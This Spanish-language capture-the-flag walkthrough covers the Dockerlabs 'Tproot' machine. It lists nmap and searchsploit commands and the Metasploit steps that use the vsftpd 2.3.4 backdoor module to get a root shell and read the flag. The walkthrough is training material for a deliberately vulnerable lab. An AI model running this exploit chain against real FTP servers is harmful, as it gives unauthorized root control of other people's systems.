```markdown
# Máquina Tproot - Dockerlabs

## Descripción
Tproot es una máquina de la plataforma Dockerlabs con un nivel de dificultad **Muy Fácil**. En este laboratorio, se explora una vulnerabilidad crítica en el servicio FTP (vsftpd 2.3.4) que permite la ejecución de comandos remotos mediante una puerta trasera (backdoor). El objetivo es obtener acceso root a la máquina y encontrar la flag en el directorio `/root`.

## Resumen de conceptos trabajados
- Escaneo de puertos con Nmap.
- Uso de Searchsploit para buscar vulnerabilidades.
- Explotación de la vulnerabilidad con Metasploit.
- Obtención de una shell con privilegios de root.

## Pasos para la resolución

### 1. **Preparación del entorno**
- Descargar la máquina Tproot de Dockerlabs.
- Desplegar la máquina en el entorno local.
- La IP de la máquina víctima es siempre `172.17.0.2`.

### 2. **Escaneo de puertos**
- Verificar si la máquina está activa:
  ```bash
  nmap -sn 172.17.0.2
  ping -c 1 172.17.0.2 -R
  ```
  El TTL de 64 indica que es una máquina Linux.

- Escanear puertos abiertos:
  ```bash
  sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG Escaneo
  ```
  Se detectan los puertos 21 (FTP) y 80 (HTTP) abiertos.

- Escanear versiones de los servicios:
  ```bash
  nmap -sCV -p80,21 172.17.0.2
  ```
  Se identifica que el servicio FTP ejecuta **vsftpd 2.3.4**, una versión vulnerable.

### 3. **Búsqueda de vulnerabilidades**
- Usar `searchsploit` para buscar exploits disponibles:
  ```bash
  searchsploit vsftpd 2.3.4
  ```
  Se encuentra el exploit **vsftpd 2.3.4 – Backdoor Command Execution**.

### 4. **Explotación con Metasploit**
- Abrir Metasploit:
  ```bash
  msfconsole
  ```

- Seleccionar el exploit:
  ```bash
  use exploit/unix/ftp/vsftpd_234_backdoor
  ```

- Configurar la IP objetivo:
  ```bash
  set RHOSTS 172.17.0.2
  ```

- Ejecutar el exploit:
  ```bash
  exploit
  ```
  Si la vulnerabilidad está activa, se obtiene una shell con privilegios de root.

### 5. **Post-explotación**
- Verificar el usuario actual:
  ```bash
  whoami
  ```
  Debería mostrar `root`.

- Buscar la flag en el directorio `/root`:
  ```bash
  cd /root
  cat root.txt
  ```

## Resumen
Para resolver la máquina Tproot:
1. Se realizó un escaneo de puertos con Nmap, identificando los servicios FTP y HTTP.
2. Se encontró que el servicio FTP ejecutaba una versión vulnerable de vsftpd (2.3.4).
3. Se utilizó Metasploit para explotar la vulnerabilidad y obtener una shell con privilegios de root.
4. Finalmente, se localizó la flag en el directorio `/root`.

Este laboratorio demuestra cómo una vulnerabilidad crítica en un servicio puede permitir el control total de un sistema con solo unos pocos comandos.

---

**Nota:** Esta misma vulnerabilidad fue explotada en el laboratorio **FirstHacking**, también de nivel Muy Fácil en Dockerlabs.
```

}
